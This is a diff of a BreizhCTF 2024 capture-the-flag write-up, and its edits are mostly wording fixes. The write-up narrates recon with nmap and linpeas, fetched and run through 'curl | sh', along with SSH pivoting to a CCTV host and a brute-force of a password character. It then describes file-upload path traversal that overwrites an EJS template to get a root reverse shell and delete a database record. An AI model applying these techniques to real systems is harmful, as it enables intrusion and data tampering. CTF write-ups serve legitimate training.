@@ -38,7 +38,7 @@ Let's take look at our ip address :
 
 Our machine has an ip in the 10.35.122.0/24 subnet (10.35.122.10)
 No suspicious files or process were running on the machine, sudo -l was password protected but when looking at /usr/bin/ we noticed python3, curl and nmap. 
-Let's try to learn a little more about our environnement with linpeas : `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
+Let's try to learn a little more about our environnement with linpeas : `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`.
 No interesting privesc related information but in the network session linpeas found two interesting servers in our subnet : 
 `10.35.122.11 meetingcam meetingcam`
 `10.35.122.20 bastion bastion`
@@ -54,13 +54,13 @@ Let's dig deeper into this with nmap :
 
 -10.35.122.20 = "bastion" is running ssh on port 22, SMTP on port 25 and a DNS on port 53. The returned hostname is bastion.casinolimit.bzh.
 
-The two messages indicated we have to check CCTV and then check our emails on the bastion. The result of the nmap scan seem very promising. 
+The two messages indicated we have to check CCTV and then check our emails on the bastion. The result of the nmap scan seems very promising. 
 
 ## CCTV 
-Since the camera seem to be accessible on port 5000 on the "meeting cam" server, let's try to access it : 
+Since the camera seems to be accessible on port 5000 on the "meeting cam" server, let's try to access it : 
 `curl -i http://10.35.122.11:5000/` 
-The answer is the same as with the nmap scan, the server answers us, but we don't have a valid endpoint. 
-Since it seems like an API is implemented, let's try `curl -X GET http://10.35.122.11:5000/api/openapi.json` : still no success
+The answer is the same as with the nmap scan, the server answers us, but we don't have a valid API endpoint. 
+Since it appears to work with an HTTP API is implemented, let's try `curl -X GET http://10.35.122.11:5000/api/openapi.json` : still no success
 
 Then we remembered the message "check cctv with your **current creds**". Let's try to login via ssh from the start machine to the meeting-cam : 
 ![SSH login CCTV](/BREIZHCTF/2024/images/3_ssh_meeting_cam.png)
@@ -87,8 +87,7 @@ And by moving the camera around and taking screenshots + scp-ing them to our loc
 
 ![CCTV screenshot 2](/BREIZHCTF/2024/images/7_snapshot_camera_credentials.jpg)
 
-Unfortunately there was a super mario "?" block, hidding one character in the credentials. We wrote down user = tocean and
-password : kaeCaiSo ? jie7i
+Unfortunately there was a super mario "?" block, hidding one character in the credentials. We wrote down user = tocean and password : kaeCaiSo **?** jie7i
 
 ## Bastion 
 Hydra wasn't downloaded onto the machine and we didn't have the root priviledges to install it, but we had python3, let's do this the old fashioned way and write a script to bruteforce the missing character and connect to the bastion.
@@ -134,7 +133,7 @@ After looking around several mails, including the one where Camille asks for the
 ![Mail pentest on bastion](/BREIZHCTF/2024/images/10_rapport_pentest_mail.png)
 
 The pentest report seems to be included in attachments of this file. 
-After talking with the challmaker we realised the "mutt" client was installed to faciliated the reading of the mails directly into the terminal. As it is written the pdf seems to be compressed in b64. To restore the pdf, we can simply copy the whole b64 string into a file on our laptop, and `cat file.txt | base64 -d > pentest_report.pdf`.
+After talking with the challmaker we realised the "mutt" client was installed to facilitate the reading of the mails directly into the terminal. As it is written the pdf appears to be compressed in b64. To restore the pdf, we can simply copy the whole b64 string into a file on our laptop, and `cat file.txt | base64 -d > pentest_report.pdf`.
 
 ## Intranet
 We now have access to a 30 pages pentest report about the Casino's intranet website : 
@@ -187,7 +186,7 @@ By reading through the report we found out :
 
 - That the website is vulnerable to an SSTI
 
-With all these information we started to play around with the file upload and found out that we can not only have any extension but also that path travel was possible. Meaning we can upload any file anywhere on the fs (as long as the account running the website has enough permission).
+With all these information in mind we started to play around with the file upload and found out that we can not only have any extension but also that path travel was possible. Meaning we can upload any file anywhere on the fs (as long as the account running the website has enough permission).
 
 With all these information we started crafting our first test payload and named it "header.ejs" to replace the original file that would be executed. 
 
@@ -213,7 +212,7 @@ And it works !
 ![Reverse Shell](/BREIZHCTF/2024/images/20_reverse_shell.png)
 
 We're even root on the server.. let's find the postgres database and delete Camille from it. 
-Slight problem no postgr client is installed : no problem we're root, let's install one with apt
+No postgres client is installed : no problem we're root, let's install one with apt
 In the .env directory we find the credentials to connect to the database and list the clients table : 
  
 ![Clients table](/BREIZHCTF/2024/images/21_camille_clients.png)
@@ -223,3 +222,4 @@ We now have the id of Camille, let's delete her from the casino to free her from
 
 On the bastion, we received a notification that we have a new mail, let's check it out : 
 ![Flag !](/BREIZHCTF/2024/images/22_final.png)
+
